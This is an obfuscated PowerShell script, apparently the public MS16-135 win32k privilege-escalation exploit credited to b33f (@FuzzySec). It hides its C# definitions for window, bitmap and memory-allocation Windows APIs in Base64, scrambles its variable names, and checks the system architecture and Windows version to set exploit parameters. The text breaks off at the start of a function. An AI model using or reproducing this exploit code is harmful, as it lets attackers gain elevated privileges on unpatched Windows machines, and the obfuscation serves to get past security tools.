Add-Type -TypeDefinition $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGkAbgBnACAAUwB5AHMAdABlAG0AOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAA7AA0ACgANAAoAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQANAAoAcAB1AGIAbABpAGMAIABzAHQAcgB1AGMAdAAgAEkATgBQAFUAVAANAAoAewANAAoACQBwAHUAYgBsAGkAYwAgAGkAbgB0ACAAaQB0AHkAcABlADsADQAKAAkAcAB1AGIAbABpAGMAIABLAEUAWQBCAEQASQBOAFAAVQBUACAAVQA7AA0ACgAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIABTAGkAegBlADsADQAKAH0ADQAKAA0ACgBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAA0ACgBwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAASwBFAFkAQgBEAEkATgBQAFUAVAANAAoAewANAAoACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMQA2ACAAdwBWAGsAOwANAAoACQBwAHUAYgBsAGkAYwAgAFUASQBuAHQAMQA2ACAAdwBTAGMAYQBuADsADQAKAAkAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAZAB3AEYAbABhAGcAcwA7AA0ACgAJAHAAdQBiAGwAaQBjACAAaQBuAHQAIAB0AGkAbQBlADsADQAKAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGQAdwBFAHgAdAByAGEASQBuAGYAbwA7AA0ACgB9AA0ACgANAAoAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACkAXQAgAA0ACgBwAHUAYgBsAGkAYwAgAHMAdAByAHUAYwB0ACAAdABhAGcATQBTAEcAIAAgAA0ACgB7ACAAIAANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAaAB3AG4AZAA7AA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIABtAGUAcwBzAGEAZwBlADsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABVAEkAbgB0AFAAdAByACAAdwBQAGEAcgBhAG0AOwANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAFUASQBuAHQAUAB0AHIAIABsAFAAYQByAGEAbQA7AA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAVQBJAG4AdAAzADIAIAB0AGkAbQBlADsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABQAE8ASQBOAFQAIABwAHQAOwANAAoAfQANAAoADQAKAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABQAE8ASQBOAFQADQAKAHsAIAAgAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAMwAyACAAeAA7AA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAMwAyACAAWQA7AA0ACgB9AA0ACgANAAoAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABtAHMAMQA2ADEAMwA1AA0ACgB7AA0ACgAJAGQAZQBsAGUAZwBhAHQAZQAgAEkAbgB0AFAAdAByACAAVwBuAGQAUAByAG8AYwAoAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAFcAbgBkACwADQAKAAkACQB1AGkAbgB0ACAAbQBzAGcALAANAAoACQAJAEkAbgB0AFAAdAByACAAdwBQAGEAcgBhAG0ALAANAAoACQAJAEkAbgB0AFAAdAByACAAbABQAGEAcgBhAG0AKQA7AA0ACgANAAoACQBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4AUwB0AHIAdQBjAHQATABhAHkAbwB1AHQAKABMAGEAeQBvAHUAdABLAGkAbgBkAC4AUwBlAHEAdQBlAG4AdABpAGEAbAAsAEMAaABhAHIAUwBlAHQAPQBDAGgAYQByAFMAZQB0AC4AVQBuAGkAYwBvAGQAZQApAF0ADQAKAAkAcwB0AHIAdQBjAHQAIABXAE4ARABDAEwAQQBTAFMARQBYAA0ACgAJAHsADQAKAAkACQBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABjAGIAUwBpAHoAZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAcwB0AHkAbABlADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABwAGYAbgBXAG4AZABQAHIAbwBjADsADQAKAAkACQBwAHUAYgBsAGkAYwAgAGkAbgB0ACAAYwBiAEMAbABzAEUAeAB0AHIAYQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABpAG4AdAAgAGMAYgBXAG4AZABFAHgAdAByAGEAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAEkAbgBzAHQAYQBuAGMAZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgASQBjAG8AbgA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgAQwB1AHIAcwBvAHIAOwANAAoACQAJAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABoAGIAcgBCAGEAYwBrAGcAcgBvAHUAbgBkADsADQAKAAkACQBbAE0AYQByAHMAaABhAGwAQQBzACgAVQBuAG0AYQBuAGEAZwBlAGQAVAB5AHAAZQAuAEwAUABXAFMAdAByACkAXQANAAoACQAJAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABsAHAAcwB6AE0AZQBuAHUATgBhAG0AZQA7AA0ACgAJAAkAWwBNAGEAcgBzAGgAYQBsAEEAcwAoAFUAbgBtAGEAbgBhAGcAZQBkAFQAeQBwAGUALgBMAFAAVwBTAHQAcgApAF0ADQAKAAkACQBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABwAHMAegBDAGwAYQBzAHMATgBhAG0AZQA7AA0ACgAJAAkAcAB1AGIAbABpAGMAIABJAG4AdABQAHQAcgAgAGgASQBjAG8AbgBTAG0AOwANAAoACQB9AA0ACgAJAA0ACgAJAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoACQBzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAUwB5AHMAdABlAG0ALgBVAEkAbgB0ADEANgAgAFIAZQBnAGkAcwB0AGUAcgBDAGwAYQBzAHMAVwAoAA0ACgAJAAkAWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAEkAbgBdACAAcgBlAGYAIABXAE4ARABDAEwAQQBTAFMARQBYACAAbABwAFcAbgBkAEMAbABhAHMAcwApADsADQAKAA0ACgAJAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEMAcgBlAGEAdABlAFcAaQBuAGQAbwB3AEUAeABXACgADQAKAAkACQBVAEkAbgB0ADMAMgAgAGQAdwBFAHgAUwB0AHkAbABlACwADQAKAAkACQBbAE0AYQByAHMAaABhAGwAQQBzACgAVQBuAG0AYQBuAGEAZwBlAGQAVAB5AHAAZQAuAEwAUABXAFMAdAByACkAXQANAAoACQAJAHMAdAByAGkAbgBnACAAbABwAEMAbABhAHMAcwBOAGEAbQBlACwADQAKAAkACQBbAE0AYQByAHMAaABhAGwAQQBzACgAVQBuAG0AYQBuAGEAZwBlAGQAVAB5AHAAZQAuAEwAUABXAFMAdAByACkAXQANAAoACQAJAHMAdAByAGkAbgBnACAAbABwAFcAaQBuAGQAbwB3AE4AYQBtAGUALAANAAoACQAJAFUASQBuAHQAMwAyACAAZAB3AFMAdAB5AGwAZQAsAA0ACgAJAAkASQBuAHQAMwAyACAAeAAsAA0ACgAJAAkASQBuAHQAMwAyACAAeQAsAA0ACgAJAAkASQBuAHQAMwAyACAAbgBXAGkAZAB0AGgALAANAAoACQAJAEkAbgB0ADMAMgAgAG4ASABlAGkAZwBoAHQALAANAAoACQAJAEkAbgB0AFAAdAByACAAaABXAG4AZABQAGEAcgBlAG4AdAAsAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAE0AZQBuAHUALAANAAoACQAJAEkAbgB0AFAAdAByACAAaABJAG4AcwB0AGEAbgBjAGUALAANAAoACQAJAEkAbgB0AFAAdAByACAAbABwAFAAYQByAGEAbQApADsADQAKAA0ACgAJAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoACQBzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAUwB5AHMAdABlAG0ALgBJAG4AdABQAHQAcgAgAEQAZQBmAFcAaQBuAGQAbwB3AFAAcgBvAGMAVwAoAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAFcAbgBkACwADQAKAAkACQB1AGkAbgB0ACAAbQBzAGcALAANAAoACQAJAEkAbgB0AFAAdAByACAAdwBQAGEAcgBhAG0ALAANAAoACQAJAEkAbgB0AFAAdAByACAAbABQAGEAcgBhAG0AKQA7AA0ACgANAAoACQBbAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAEQAZQBzAHQAcgBvAHkAVwBpAG4AZABvAHcAKAANAAoACQAJAEkAbgB0AFAAdAByACAAaABXAG4AZAApADsADQAKAA0ACgAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFUAbgByAGUAZwBpAHMAdABlAHIAQwBsAGEAcwBzACgADQAKAAkACQBTAHQAcgBpAG4AZwAgAGwAcABDAGwAYQBzAHMATgBhAG0AZQAsAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAEkAbgBzAHQAYQBuAGMAZQApADsADQAKAA0ACgAJAFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAIAA9ACAAdAByAHUAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABNAG8AZAB1AGwAZQBIAGEAbgBkAGwAZQBXACgADQAKAAkACQBbAE0AYQByAHMAaABhAGwAQQBzACgAVQBuAG0AYQBuAGEAZwBlAGQAVAB5AHAAZQAuAEwAUABXAFMAdAByACkAXQANAAoACQAJAFMAdAByAGkAbgBnACAAbABwAE0AbwBkAHUAbABlAE4AYQBtAGUAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAFMAZQB0AFcAaQBuAGQAbwB3AEwAbwBuAGcAUAB0AHIAIgApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABTAGUAdABXAGkAbgBkAG8AdwBMAG8AbgBnAFAAdAByACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQALAANAAoACQAJAGkAbgB0ACAAbgBJAG4AZABlAHgALAANAAoACQAJAEkAbgB0AFAAdAByACAAZAB3AE4AZQB3AEwAbwBuAGcAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABTAGgAbwB3AFcAaQBuAGQAbwB3ACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQALAANAAoACQAJAGkAbgB0ACAAbgBDAG0AZABTAGgAbwB3ACkAOwANAAoADQAKAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIAdQBlACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAFMAZQB0AFAAYQByAGUAbgB0ACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQAQwBoAGkAbABkACwADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQATgBlAHcAUABhAHIAZQBuAHQAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAGYAYQBsAHMAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABHAGUAdABEAGUAcwBrAHQAbwBwAFcAaQBuAGQAbwB3ACgAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABTAGUAdABGAG8AcgBlAGcAcgBvAHUAbgBkAFcAaQBuAGQAbwB3ACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAdgBvAGkAZAAgAFMAdwBpAHQAYwBoAFQAbwBUAGgAaQBzAFcAaQBuAGQAbwB3ACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQALAANAAoACQAJAGIAbwBvAGwAIABmAEEAbAB0AFQAYQBiACkAOwANAAoADQAKAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAdQBzAGUAcgAzADIALgBkAGwAbAAiACkAXQANAAoACQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAARwBlAHQATQBlAHMAcwBhAGcAZQAoAA0ACgAJAAkAbwB1AHQAIAB0AGEAZwBNAFMARwAgAGwAcABNAHMAZwAsAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAFcAbgBkACwADQAKAAkACQB1AGkAbgB0ACAAdwBNAHMAZwBGAGkAbAB0AGUAcgBNAGkAbgAsAA0ACgAJAAkAdQBpAG4AdAAgAHcATQBzAGcARgBpAGwAdABlAHIATQBhAHgAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABUAHIAYQBuAHMAbABhAHQAZQBNAGUAcwBzAGEAZwBlACgADQAKAAkACQBbAEkAbgBdACAAcgBlAGYAIAB0AGEAZwBNAFMARwAgAGwAcABNAHMAZwApADsADQAKAA0ACgAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAHUAcwBlAHIAMwAyAC4AZABsAGwAIgApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABEAGkAcwBwAGEAdABjAGgATQBlAHMAcwBhAGcAZQAoAA0ACgAJAAkAWwBJAG4AXQAgAHIAZQBmACAAdABhAGcATQBTAEcAIABsAHAAbQBzAGcAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAUwBlAHQARgBvAGMAdQBzACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAVwBuAGQAKQA7AA0ACgANAAoACQBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgB1AHMAZQByADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAHUAaQBuAHQAIABTAGUAbgBkAEkAbgBwAHUAdAAoAA0ACgAJAAkAdQBpAG4AdAAgAG4ASQBuAHAAdQB0AHMALAAgAA0ACgAJAAkAWwBJAG4AXQAgAEkATgBQAFUAVAAgAHAASQBuAHAAdQB0AHMALAAgAA0ACgAJAAkAaQBuAHQAIABjAGIAUwBpAHoAZQApADsADQAKAA0ACgAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGcAZABpADMAMgAuAGQAbABsACIAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGkAbgB0ACAARwBlAHQAQgBpAHQAbQBhAHAAQgBpAHQAcwAoAA0ACgAJAAkASQBuAHQAUAB0AHIAIABoAGIAbQBwACwADQAKAAkACQBpAG4AdAAgAGMAYgBCAHUAZgBmAGUAcgAsAA0ACgAJAAkASQBuAHQAUAB0AHIAIABsAHAAdgBCAGkAdABzACkAOwANAAoADQAKAAkAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAZwBkAGkAMwAyAC4AZABsAGwAIgApAF0ADQAKAAkAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAaQBuAHQAIABTAGUAdABCAGkAdABtAGEAcABCAGkAdABzACgADQAKAAkACQBJAG4AdABQAHQAcgAgAGgAYgBtAHAALAANAAoACQAJAGkAbgB0ACAAYwBiAEIAeQB0AGUAcwAsAA0ACgAJAAkASQBuAHQAUAB0AHIAIABsAHAAQgBpAHQAcwApADsADQAKAA0ACgAJAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAJAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABBAGwAbABvAGMAKAANAAoACQAJAEkAbgB0AFAAdAByACAAbABwAEEAZABkAHIAZQBzAHMALAANAAoACQAJAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsAA0ACgAJAAkAVQBJAG4AdAAzADIAIABmAGwAQQBsAGwAbwBjAGEAdABpAG8AbgBUAHkAcABlACwADQAKAAkACQBVAEkAbgB0ADMAMgAgAGYAbABQAHIAbwB0AGUAYwB0ACkAOwANAAoADQAKAAkAcAB1AGIAbABpAGMAIABVAEkAbgB0ADEANgAgAEMAdQBzAHQAbwBtAEMAbABhAHMAcwAoAHMAdAByAGkAbgBnACAAYwBsAGEAcwBzAF8AbgBhAG0AZQApAA0ACgAJAHsADQAKAAkACQBtAF8AdwBuAGQAXwBwAHIAbwBjAF8AZABlAGwAZQBnAGEAdABlACAAPQAgAEMAdQBzAHQAbwBtAFcAbgBkAFAAcgBvAGMAOwANAAoACQAJAFcATgBEAEMATABBAFMAUwBFAFgAIAB3AGkAbgBkAF8AYwBsAGEAcwBzACAAPQAgAG4AZQB3ACAAVwBOAEQAQwBMAEEAUwBTAEUAWAAoACkAOwANAAoACQAJAHcAaQBuAGQAXwBjAGwAYQBzAHMALgBsAHAAcwB6AEMAbABhAHMAcwBOAGEAbQBlACAAPQAgAGMAbABhAHMAcwBfAG4AYQBtAGUAOwANAAoACQAJAC8ALwAvAHcAaQBuAGQAXwBjAGwAYQBzAHMALgBjAGIAUwBpAHoAZQAgAD0AIAAoAHUAaQBuAHQAKQBNAGEAcgBzAGgAYQBsAC4AUwBpAHoAZQBPAGYAKAB3AGkAbgBkAF8AYwBsAGEAcwBzACkAOwANAAoACQAJAHcAaQBuAGQAXwBjAGwAYQBzAHMALgBsAHAAZgBuAFcAbgBkAFAAcgBvAGMAIAA9ACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAC4ARwBlAHQARgB1AG4AYwB0AGkAbwBuAFAAbwBpAG4AdABlAHIARgBvAHIARABlAGwAZQBnAGEAdABlACgAbQBfAHcAbgBkAF8AcAByAG8AYwBfAGQAZQBsAGUAZwBhAHQAZQApADsADQAKAAkACQByAGUAdAB1AHIAbgAgAFIAZQBnAGkAcwB0AGUAcgBDAGwAYQBzAHMAVwAoAHIAZQBmACAAdwBpAG4AZABfAGMAbABhAHMAcwApADsADQAKAAkAfQANAAoADQAKAAkAcAByAGkAdgBhAHQAZQAgAHMAdABhAHQAaQBjACAASQBuAHQAUAB0AHIAIABDAHUAcwB0AG8AbQBXAG4AZABQAHIAbwBjACgASQBuAHQAUAB0AHIAIABoAFcAbgBkACwAIAB1AGkAbgB0ACAAbQBzAGcALAAgAEkAbgB0AFAAdAByACAAdwBQAGEAcgBhAG0ALAAgAEkAbgB0AFAAdAByACAAbABQAGEAcgBhAG0AKQANAAoACQB7AA0ACgAJAAkAcgBlAHQAdQByAG4AIABEAGUAZgBXAGkAbgBkAG8AdwBQAHIAbwBjAFcAKABoAFcAbgBkACwAIABtAHMAZwAsACAAdwBQAGEAcgBhAG0ALAAgAGwAUABhAHIAYQBtACkAOwANAAoACQB9AA0ACgANAAoACQBwAHIAaQB2AGEAdABlACAAVwBuAGQAUAByAG8AYwAgAG0AXwB3AG4AZABfAHAAcgBvAGMAXwBkAGUAbABlAGcAYQB0AGUAOwANAAoAfQA=')))
	${_/===\/\/==\/=\/\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CQAgAF8AXwBfAF8AXwAgAF8AXwBfAF8AXwAgAF8AXwBfACAAIAAgAF8AXwBfACAAIAAgACAAIABfAF8AXwAgACAAIABfAF8AXwAgAF8AXwBfACAADQAKAAkAfAAgACAAIAAgACAAfAAgACAAIABfAF8AfABfACAAIAB8ACAAfAAgACAAXwB8AF8AXwBfAHwAXwAgACAAfAAgAHwAXwAgACAAfAAgACAAXwB8AA0ACgAJAHwAIAB8ACAAfAAgAHwAXwBfACAAIAAgAHwAXwB8ACAAfABfAHwAIAAuACAAfABfAF8AXwB8AF8AfAAgAHwAXwB8AF8AIAAgAHwAXwAgACAAfAANAAoACQB8AF8AfABfAHwAXwB8AF8AXwBfAF8AXwB8AF8AXwBfAF8AXwB8AF8AXwBfAHwAIAAgACAAfABfAF8AXwBfAF8AfABfAF8AXwB8AF8AXwBfAHwADQAKAAkACQAJAAkACQAJAAkACQAJAAkADQAKAAkAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAGIAeQAgAGIAMwAzAGYAIAAtAD4AIABAAEYAdQB6AHoAeQBTAGUAYwBdAA0ACgAJAAkACQAJAAkAIAAgACAA')))
${_/===\/\/==\/=\/\}
if ([System.IntPtr]::Size -ne 8) {
	echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('CgBbACEAXQAgAFQAYQByAGcAZQB0ACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABpAHMAIAB4ADYANAAgAG8AbgBsAHkAIQAKAA==')))
	Return
}
${__/\/=\_/=\/==\/\} = [Version](gwmi Win32_OperatingSystem).Version
${Script:___/===\/\/\/\_/\} = "$(${__/\/=\_/=\/==\/\}.Major).$(${__/\/=\_/=\/==\/\}.Minor)"
switch (${___/===\/\/\/\_/\})
{
	$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAwAC4AMAA='))) 
	{
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAFcAaQBuACAAMQAwAA==')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABCAGkAdABtAGEAcAAgAGQAaQBtAGUAbgBzAGkAbwBuAHMAOgAgADAAeAA3ADYAMAAqADAAeAA0AAoA')))
	}
	$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADMA'))) 
	{
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAFcAaQBuACAAOAAuADEA')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABCAGkAdABtAGEAcAAgAGQAaQBtAGUAbgBzAGkAbwBuAHMAOgAgADAAeAA3ADYAMAAqADAAeAA0AAoA')))
	}
	$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADIA'))) 
	{
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAFcAaQBuACAAOAA=')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABCAGkAdABtAGEAcAAgAGQAaQBtAGUAbgBzAGkAbwBuAHMAOgAgADAAeAA3ADYAMAAqADAAeAA0AAoA')))
	}
	$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NgAuADEA'))) 
	{
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwA/AF0AIABUAGEAcgBnAGUAdAAgAGkAcwAgAFcAaQBuACAANwA=')))
		echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABCAGkAdABtAGEAcAAgAGQAaQBtAGUAbgBzAGkAbwBuAHMAOgAgADAAeAA3ADcAMAAqADAAeAA0AAoA')))
	}
}
function __/\/\/\/===\_/\/\ {
